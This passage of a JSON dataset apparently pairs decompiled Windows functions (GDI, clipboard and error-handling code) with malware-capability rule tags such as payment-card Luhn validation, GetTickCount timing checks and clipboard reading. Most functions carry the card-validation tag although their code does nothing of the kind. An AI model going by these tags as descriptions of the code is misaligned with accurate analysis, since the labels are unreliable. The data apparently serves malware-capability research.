        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420fa4(uint param_1, uchar param_2)\n\n{\n    fcn.00420bb0(param_2);\n    fcn.00420bc8();\n    return;\n}\n",
        "token_count": 47
    },
    "00421060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00421060(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.0041ff50();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 4;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 175
    },
    "004210cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004210cc(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x4210e7;\n    cVar1 = fcn.004040e4();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x4210f7;\n        fcn.00420790();\n        uStack24 = 0x42116c;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x42110f;\n        puStack20 = &stack0xfffffffc;\n        fcn.00420790();\n        uStack36 = 0x42114f;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.00420174();\n        fcn.004212b4();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x421156;\n        uStack36 = 0x42114e;\n        fcn.004207a0();\n        return;\n    }\n    puStack20 = 0x42117e;\n    fcn.00415504();\n    return;\n}\n",
        "token_count": 335
    },
    "004211f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004211f4(void)\n\n{\n    fcn.00421184();\n    fcn.0042119c();\n    return;\n}\n",
        "token_count": 33
    },
    "004212d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004212d0(void)\n\n{\n    fcn.00421184();\n    fcn.0042119c();\n    return;\n}\n",
        "token_count": 33
    },
    "00421300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421300(uint param_1, int32_t param_2)\n\n{\n    if (-1 < param_2) {\n        fcn.00421184();\n        fcn.0042119c();\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "0042132c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042132c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.0041ff50();\n    *(in_EAX + 0x10) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 161
    },
    "00421394": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00421394(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x4213af;\n    cVar1 = fcn.004040e4();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x4213bb;\n        fcn.00420790();\n        uStack24 = 0x421424;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x4213d3;\n        puStack20 = &stack0xfffffffc;\n        fcn.00420790();\n        uStack36 = 0x421407;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.00420174();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x42140e;\n        uStack36 = 0x421406;\n        fcn.004207a0();\n        return;\n    }\n    puStack20 = 0x421436;\n    fcn.00415504();\n    return;\n}\n",
        "token_count": 322
    },
    "004214a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004214a8(uint param_1, uint param_2)\n\n{\n    fcn.00421458(*0x490dbc, *0x490dc0, param_2, *0x490dc8);\n    return;\n}\n",
        "token_count": 57
    },
    "00421624": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00421624(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    sub.kernel32.dll_InitializeCriticalSection();\n    iVar1 = fcn.00420a44();\n    *(in_EAX + 0xc) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x421ee0;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.00421060();\n    *(in_EAX + 0x10) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x421f00;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.0042132c();\n    *(in_EAX + 0x14) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x421f20;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    *(in_EAX + 0x20) = 0xcc0020;\n    *(in_EAX + 8) = *0x4216e4;\n    fcn.0041522c();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = in_EAX + 0x38;\n    }\n    return in_EAX;\n}\n",
        "token_count": 425
    },
    "004217cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004217cc(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *arg_8h_00;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (arg_8h != NULL) {\n        cVar1 = (**(*arg_8h + 0x1c))();\n        if (cVar1 == '\\0') {\n            (**(*in_EAX + 0x10))();\n            fcn.00421d68();\n            fcn.004214cc();\n            uVar2 = fcn.0042074c();\n            sub.gdi32.dll_SetBkColor(in_EAX[1], uVar2);\n            uVar2 = fcn.0042074c();\n            sub.gdi32.dll_SetTextColor(in_EAX[1], uVar2);\n            iVar3 = (**(*arg_8h + 0x20))();\n            iVar3 = iVar3 + var_4h;\n            arg_8h_00 = &var_14h;\n            (**(*arg_8h + 0x2c))();\n            fcn.00413a94(arg_8h_00, iVar3);\n            (**(*arg_8h + 0x14))();\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    return;\n}\n",
        "token_count": 320
    },
    "00421ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00421ac0(void)\n\n{\n    ulong uStack16;\n    \n    fcn.00421a78();\n    return uStack16;\n}\n",
        "token_count": 35
    },
    "00421adc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00421adc(void)\n\n{\n    uint uStack12;\n    \n    fcn.00421a78();\n    return CONCAT44(uStack12, uStack12);\n}\n",
        "token_count": 40
    },
    "00421bd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421bd0(uint param_1, uint *param_2)\n\n{\n    fcn.00421950(*param_2, param_2[1]);\n    return;\n}\n",
        "token_count": 45
    },
    "00421d14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421d14(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack16;\n    uint uStack12;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (*(in_EAX + 4) != 0) {\n            fcn.00421cb0();\n            fcn.00421ba8();\n            *(in_EAX + 0x18) = uStack16;\n            *(in_EAX + 0x1c) = uStack12;\n            *(in_EAX + 4) = 0;\n            *(in_EAX + 8) = *(in_EAX + 8) & 0xfe;\n        }\n        if (param_2 != 0) {\n            *(in_EAX + 8) = *(in_EAX + 8) | 1;\n            *(in_EAX + 4) = param_2;\n            fcn.00421bd0();\n        }\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "00421fe8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00421fe8(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffecc;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_104h;\n    uint var_100h;\n    \n    puStack272 = &stack0xfffffffc;\n    uStack276 = 0x422084;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack280;\n    iVar1 = sub.kernel32.dll_GetLastError_1();\n    if (iVar1 != 0) {\n        in_stack_fffffecc = 0x1000;\n        iVar1 = sub.kernel32.dll_FormatMessageA(0x1000, 0, iVar1, 0x400, &var_100h, 0x100, 0);\n        if (iVar1 != 0) {\n            fcn.00405010();\n            fcn.0040c5ac();\n            fcn.004047cc();\n            goto code_r0x0042206b;\n        }\n    }\n    fcn.00421f94();\ncode_r0x0042206b:\n    *in_FS_OFFSET = in_stack_fffffecc;\n    fcn.00404da0(0x42208b);\n    return;\n}\n",
        "token_count": 292
    },
    "00422220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00422220(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return (in_EAX * param_2 + (param_1 - 1U) & ~(param_1 - 1U)) / 8;\n}\n",
        "token_count": 71
    },
    "004225d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004225d8(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffbb8;\n    uint var_424h;\n    uint var_420h;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uint uStack1044;\n    uint var_408h;\n    uchar var_404h [28];\n    int32_t lppe;\n    uint var_3e4h;\n    uchar auStack996 [988];\n    uint hdc;\n    \n    uStack1044 = 0x422604;\n    fcn.00402ee0();\n    uStack1044 = 0;\n    puStack1048 = 0x42260b;\n    hdc = sub.user32.dll_GetDC();\n    uStack1052 = 0x4226d5;\n    uStack1056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbe0;\n    puStack1048 = &stack0xfffffffc;\n    iVar1 = sub.gdi32.dll_GetDeviceCaps();\n    if (0xf < iVar1) {\n        sub.gdi32.dll_GetSystemPaletteEntries(hdc, 0, 8, &stack0xfffffbf8);\n        in_stack_fffffbb8 = hdc;\n        if (lppe == 0xc0c0c0) {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 1, &fcn.004225d8::lppe);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -7, 7, &stack0xfffffc1c);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, 7, 1, &fcn.004225d8::var_3e4h);\n        }\n        else {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 8, &fcn.004225d8::var_3e4h);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffbb8;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x4226dc);\n    return;\n}\n",
        "token_count": 479
    },
    "00422a4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00422a4c(int32_t arg_8h)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint8_t *in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = *in_EDX - **(arg_8h + 8);\n    uVar5 = in_EDX[1] - *(*(arg_8h + 8) + 4);\n    uVar6 = *in_EAX - **(arg_8h + 8);\n    uVar1 = in_EAX[1] - *(*(arg_8h + 8) + 4);\n    if ((((uVar6 ^ uVar6 >> 0x1f) - (uVar6 >> 0x1f) < (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f)) ||\n        (((0 < uVar4 && (uVar6 < uVar4)) ||\n         (iVar2 = (uVar1 ^ uVar1 >> 0x1f) - (uVar1 >> 0x1f),  iVar2 < (uVar5 ^ uVar5 >> 0x1f) - (uVar5 >> 0x1f))))) ||\n       ((0 < uVar5 && (uVar1 < uVar5)))) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = CONCAT31(iVar2 >> 8, 1);\n    }\n    return uVar3;\n}\n",
        "token_count": 389
    },
    "00422de8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint16_t fcn.00422de8(void)\n\n{\n    uint16_t *in_EAX;\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    \n    uVar2 = 0;\n    puVar1 = in_EAX + 10;\n    for (; in_EAX < puVar1; in_EAX = in_EAX + 1) {\n        uVar2 = uVar2 ^ *in_EAX;\n    }\n    return uVar2;\n}\n",
        "token_count": 107
    },
    "00422ee4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00422ee4(uint arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t *in_EDX;\n    uint var_28h;\n    uint var_1ah;\n    uint var_14h;\n    int32_t var_8h;\n    \n    fcn.00422e00();\n    if (var_1ah < 9) {\n        if (var_8h == 0) {\n            *in_EDX = (1 << (var_1ah & 0x1f)) * 4 + 0x28;\n        }\n        else {\n            *in_EDX = var_8h * 4 + 0x28;\n        }\n    }\n    else {\n        *in_EDX = 0x28;\n        if ((var_1ah._2_1_ & 3) != 0) {\n            *in_EDX = *in_EDX + 0xc;\n        }\n    }\n    *in_ECX = var_14h;\n    return;\n}\n",
        "token_count": 235
    },
    "0042322c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042322c(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 131
    },
    "004232d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004232d4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(*in_EAX + 0x44);\n    fcn.0042327c(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 102
    },
    "00423634": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423634(uint param_1, char param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x42364b;\n        fcn.0040427c();\n    }\n    uStack52 = 0x423711;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.00403f28();\n    uVar2 = 0;\n    uVar1 = *0x41fa74;\n    fcn.00406a50();\n    fcn.004237b4(uVar1, uVar2);\n    uVar2 = 0;\n    uVar1 = *0x41fa74;\n    fcn.00406a50();\n    fcn.004237b4(uVar1, uVar2);\n    uVar2 = 0;\n    uVar1 = *0x41fd00;\n    fcn.00406a50();\n    fcn.004237b4(uVar1, uVar2);\n    uVar2 = 0;\n    uVar1 = *0x41fbb8;\n    fcn.00406a50();\n    fcn.004237b4(uVar1, uVar2);\n    *in_FS_OFFSET = uVar1;\n    fcn.00404dc4(0x423718);\n    return;\n}\n",
        "token_count": 383
    },
    "004237b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004237b4(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x423837;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = fcn.00405c4c();\n    fcn.00408b80();\n    fcn.00404df4();\n    *puVar1 = arg_8h;\n    fcn.00404df4();\n    puVar1[3] = arg_ch;\n    fcn.00414d8c();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42383e;\n    uStack36 = 0x423836;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 239
    },
    "00423c08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00423c08(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 4) = uVar1;\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 8) = uVar1;\n    fcn.00423cb4();\n    fcn.00423cb4();\n    fcn.00423cb4();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 213
    },
    "00423cb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00423cb4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x423ccf;\n    fcn.00414d8c();\n    uStack32 = 0x423cf8;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00414d8c();\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 144
    },
    "00423da4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00423da4(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    fcn.00423d64();\n    fcn.00423d84();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 149
    },
    "00423f74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00423f74(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY68;\n    uint uStackY64;\n    uchar *puStackY60;\n    uint in_stack_ffffffc8;\n    uint *arg_ch;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack44 = 0x424098;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.00409454();\n    fcn.00405304();\n    iVar1 = fcn.00423848();\n    if (iVar1 == 0) {\n        var_10h = var_4h;\n        var_ch._0_1_ = 0xb;\n        arg_ch = &fcn.00423f74::var_10h;\n        in_stack_ffffffc8 = 0;\n        puStackY60 = 0x423fe1;\n        fcn.00406a50();\n        puStackY60 = 0x423ff0;\n        fcn.0040c5e8(in_stack_ffffffc8, arg_ch);\n        puStackY60 = 0x423ff5;\n        iVar1 = fcn.004047cc();\n    }\n    puStackY60 = 0x423ffa;\n    piVar2 = (**(iVar1 + 0x48))();\n    uStackY64 = 0x424037;\n    uStackY68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    piVar2[7] = in_EAX;\n    puStackY60 = &stack0xfffffffc;\n    var_8h = piVar2;\n    iVar1 = fcn.0040416c();\n    piVar2[6] = iVar1;\n    (**(*var_8h + 0x4c))();\n    *in_FS_OFFSET = uStackY68;\n    puStackY60 = 0x424056;\n    fcn.00403f58();\n    piVar2 = var_8h;\n    *(in_EAX + 0xc) = var_8h;\n    var_8h[5] = in_EAX;\n    puStackY60 = 0x42406a;\n    iVar1 = fcn.0040416c();\n    piVar2[4] = iVar1;\n    puStackY60 = 0x42407a;\n    fcn.00404154();\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    uStack48 = 0x42409f;\n    fcn.00404da0();\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 680
    },
    "004243d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004243d8(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0x424304;\n    fcn.0042435c(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 89
    },
    "00424874": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424874(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack132;\n    uint uStack128;\n    uchar *puStack124;\n    uint var_68h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint cbBuffer;\n    uint lpData;\n    \n    puStack124 = 0x424888;\n    fcn.004247e0();\n    puStack124 = 0x424897;\n    fcn.0041775c();\n    if (var_40h != 0x464d4520) {\n        puStack124 = 0x4248a5;\n        fcn.00421f88();\n    }\n    puStack124 = 0x4248ad;\n    uVar2 = fcn.00402ce4();\n    iVar1 = *(in_EAX + 0x28);\n    uStack128 = 0x424934;\n    uStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    fcn.00402ee0();\n    fcn.0041775c();\n    iVar3 = sub.gdi32.dll_SetEnhMetaFileBits(cbBuffer, uVar2);\n    *(iVar1 + 8) = iVar3;\n    if (iVar3 == 0) {\n        fcn.00421f88();\n    }\n    *(iVar1 + 0x18) = 0;\n    *(iVar1 + 0xc) = var_48h - var_50h;\n    *(iVar1 + 0x10) = var_44h - var_4ch;\n    *(in_EAX + 0x2c) = 1;\n    *in_FS_OFFSET = cbBuffer;\n    uStack132 = 0x42493b;\n    fcn.00402d00();\n    return;\n}\n",
        "token_count": 470
    },
    "00424ac4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424ac4(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x424b6d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = 1;\n    uStack44 = 0x424b4b;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fcn.00409454();\n    fcn.0040d314();\n    fcn.004051b0();\n    if (uVar2) {\n        *(in_EAX + 0x2c) = 0;\n    }\n    fcn.00423504();\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x2c) = uVar1;\n    return;\n}\n",
        "token_count": 302
    },
    "00425044": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.00425044(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_64h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    \n    iVar2 = sub.user32.dll_GetClipboardData(0xe);\n    if (iVar2 == 0) {\n        fcn.00421f58();\n    }\n    fcn.004247e0();\n    iVar1 = in_EAX[10];\n    uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar2, 0);\n    *(iVar1 + 8) = uVar3;\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &var_64h);\n    *(iVar1 + 0xc) = var_44h - var_4ch;\n    *(iVar1 + 0x10) = var_40h - var_48h;\n    *(iVar1 + 0x18) = 0;\n    *(in_EAX + 0xb) = 1;\n    iVar2 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar2 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 321
    },
    "00425374": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00425374(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00421624();\n    *(in_EAX + 0x58) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 166
    },
    "00425634": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
